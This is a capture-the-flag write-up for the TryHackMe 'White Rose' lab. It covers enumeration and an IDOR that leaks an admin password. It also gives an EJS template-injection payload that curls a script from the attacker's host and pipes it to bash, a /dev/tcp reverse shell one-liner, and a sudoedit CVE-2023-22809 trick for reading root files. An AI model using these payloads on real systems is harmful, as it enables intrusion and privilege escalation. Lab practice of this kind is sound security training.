---
layout: post
title: White Rose
date: 2025-04-19
categories: [CTF, SSTI]
tags: [Tryhackme]
---

### Nmap
```
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 60 nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.0 (Ubuntu)

```
Given creds from the challange `Olivia Cortez:olivi8`

# Enumeration

## HTTP (80)

### Dirsearch

- Nothing Intresting

### Vhost Fuzzing

```
www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 167ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 167ms]
```

### admin.cyprusbank.thm

- Login page 
- `Olivia Cortez:olivi8` Using this credentials we can login

![[/assets/Images/WhiteR-Adm-panel.png]]

## IDOR in msg
![[Pasted image 20250417215321.png | 1000]]

```
Found these creds using IDOR

Gayle Bev : p~]P@5!6;rs558:q
```

Since Gayle is admin we can login as admin using these creds

## Found SSTI in `/settings` 

![[Pasted image 20250417230306.png | 1000]]
- We found ejs and found a RCE about that https://security.snyk.io/vuln/SNYK-JS-EJS-2803307

```
# SSTI Payload
name=test&password=test&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync('curl http://10.17.49.29:8000');s
```
- We got a hit in our python server
![[Pasted image 20250417232348.png | 500]]

Shell.sh
```bash
bash -i >& /dev/tcp/10.17.49.29/9001 0>&1
```

payload
```
name=test&password=test&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync('curl http://10.17.49.29:8000/shell.sh|bash');s
```
- we got a shell and user flag

# Privilege Escalation

```bash
sudo -l

(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

sudoedit -v
```

#### Sudo version 1.9.12p1 leads to a vulnerability

https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis

exploit
```
export EDITOR="vi -- /root/root.txt"

sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

- We got the root flag
